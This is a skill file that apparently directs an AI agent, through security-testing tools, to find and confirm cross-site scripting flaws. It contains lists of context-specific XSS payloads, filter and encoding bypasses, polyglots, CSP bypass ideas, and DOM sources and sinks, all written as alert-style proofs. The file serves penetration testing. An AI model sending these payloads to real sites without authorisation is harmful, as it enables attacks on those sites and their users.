# XSS Detection Skill

## Objective
Identify and confirm Cross-Site Scripting (XSS) vulnerabilities by analyzing reflection contexts and testing context-appropriate payloads.

## Instructions

### 1. Find Reflection Points
Use `find_reflected` to identify where user input appears in responses:
- HTML body
- HTML attributes
- JavaScript code
- CSS styles
- URL parameters in links
- JSON responses

### 2. Determine Context
Analyze the reflection context to choose appropriate payloads:

**HTML Context:**
Input appears directly in HTML body:
```html
<div>USER_INPUT</div>
```

**Attribute Context:**
Input appears inside an attribute:
```html
<input value="USER_INPUT">
<a href="USER_INPUT">
<img src="USER_INPUT">
```

**JavaScript Context:**
Input appears in JavaScript code:
```javascript
var x = 'USER_INPUT';
var x = "USER_INPUT";
```

**URL Context:**
Input appears in href/src with javascript: possible:
```html
<a href="USER_INPUT">
```

### 3. Test Context-Specific Payloads

**HTML Context:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**Attribute Context (breaking out):**
```html
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" onclick="alert(1)" x="
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
```

**JavaScript String Context:**
```javascript
';alert(1)//
';alert(1);'
";alert(1)//
";alert(1);"
</script><script>alert(1)</script>
\';alert(1)//
'-alert(1)-'
"-alert(1)-"
```

**JavaScript Template Literal:**
```javascript
${alert(1)}
`${alert(1)}`
```

**URL/href Context:**
```
javascript:alert(1)
javascript://alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 4. Event Handler XSS
When you can inject into attributes:
```
onafterprint onbeforeprint onbeforeunload onerror onhashchange
onload onmessage onoffline ononline onpagehide onpageshow
onpopstate onresize onstorage onunload onblur onchange onclick
oncontextmenu ondblclick onfocus oninput oninvalid onkeydown
onkeypress onkeyup onmousedown onmouseenter onmouseleave
onmousemove onmouseout onmouseover onmouseup onmousewheel
onscroll onselect onsubmit onwheel oncopy oncut onpaste
ondrag ondragend ondragenter ondragleave ondragover ondragstart
ondrop onabort oncanplay oncanplaythrough ondurationchange onemptied
onended onloadeddata onloadedmetadata onloadstart onpause onplay
onplaying onprogress onratechange onseeked onseeking onstalled
onsuspend ontimeupdate onvolumechange onwaiting ontoggle onanimationend
onanimationiteration onanimationstart ontransitionend
```

### 5. DOM XSS Sources and Sinks
Look for DOM manipulation:

**Sources (user-controlled input):**
```javascript
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
location.href
location.search
location.hash
location.pathname
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
```

**Sinks (dangerous functions):**
```javascript
eval()
setTimeout()
setInterval()
Function()
document.write()
document.writeln()
innerHTML
outerHTML
insertAdjacentHTML()
element.setAttribute()
jQuery.html()
jQuery.append()
jQuery.prepend()
```

### 6. Filter Bypass Techniques

**Case variation:**
```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

**Encoding:**
```html
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
&#60;script&#62;alert(1)&#60;/script&#62;
\u003cscript\u003ealert(1)\u003c/script\u003e
%3Cscript%3Ealert(1)%3C/script%3E
```

**Tag variations:**
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<body/onload=alert(1)>
<x onclick=alert(1)>click
<svg><animate onbegin=alert(1)>
```

**Event handler variations:**
```html
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>
```

**Without parentheses:**
```html
<img src=x onerror=alert`1`>
<img src=x onerror=window.onerror=alert;throw+1>
<img src=x onerror=location='javascript:alert(1)'>
```

**Without spaces:**
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<input/onfocus=alert(1)/autofocus>
```

### 7. Polyglot Payloads
Payloads that work in multiple contexts:
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```html
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telerik.telerik.com">
```

### 8. CSP Bypass Techniques
If Content-Security-Policy is present:
- Look for allowed domains with JSONP endpoints
- Look for allowed CDNs with exploitable libraries
- Check for 'unsafe-inline' or 'unsafe-eval'
- Try base-uri manipulation
- Try data: or blob: URIs if allowed

### 9. Confirm and Document
Use browser or `http1_request` to verify execution.

If confirmed, create finding with:
- Vulnerable parameter
- Reflection context
- Working payload
- XSS type (Reflected, Stored, DOM)
- Evidence (screenshot, response showing injection)

## MCP Tools to Use
- `find_reflected`: Identify reflection points
- `http1_request` / `http2_request`: Send test payloads
- `url_encode` / `base64_encode`: Encode payloads
- `repeater_tab_with_payload`: Manual testing
- `intruder_prepare`: Automate payload testing
- `issue_create`: Report confirmed finding

## References
- PayloadsAllTheThings/XSS Injection
- PortSwigger XSS Cheat Sheet
- OWASP XSS Prevention Cheat Sheet
